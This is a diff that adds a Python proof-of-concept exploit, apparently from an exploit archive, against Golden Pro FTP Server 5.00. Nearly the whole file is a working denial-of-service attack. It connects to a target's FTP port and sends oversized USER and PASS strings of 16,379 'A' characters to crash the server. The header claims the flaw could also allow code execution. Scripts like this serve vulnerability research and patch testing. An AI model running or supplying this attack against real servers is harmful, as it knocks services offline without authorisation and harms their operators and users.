@@ -1,0 +1,48 @@
+#!/usr/bin/python
+
+#Both Golden Pro And Free FTP server is  prone to a remote DOS vulnerability.POC
+
+#Attackers can exploit this issue to execute arbitrary code or cause denial-of-service conditions.
+
+#-------------------------------------------------------------------------
+#Exploit Title : Golden FTP Server DOS vulnerability.
+#Date   : 2015.06.01
+#Exploit Author  : 4Lu5h
+#Email   : kfalus@gmail.com
+#Product Homepage: www.goldenftpserver.com
+#Software Link  : http://www.goldenftpserver.com/statdir/stat.php?id=download_pro
+#Product: Golden Pro FTP Server
+#Version : 5.00
+#Tested Os : Windows XP SP1/SP3 TR
+#--------------------------------------------------------------------------
+
+
+import socket
+import sys
+
+def usage():
+	 print "usage  : ./goldenftp.py <ip > "
+      	 print "example: ./goldenftp.py 192.168.189.19"
+
+s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+if len(sys.argv) != 2:
+        usage()
+        sys.exit()
+
+ip = sys.argv[1]
+
+buff = "A" * 16379
+
+try:
+	print("[-] Connecting to " + ip + " for exploitation..\n")
+	s.connect((ip,21))
+	s.recv(1024)
+	print "[-] Connected to server"
+	print "[-] Sending exploit"
+	s.send('USER '+buff+'\r\n') #if fails try username test 
+	s.send('PASS '+buff+'\r\n')
+	s.close()
+	print("[-] Exploit successfully sent...")
+except:
+	print "[-] Exploit failed.. Check if server is up.."
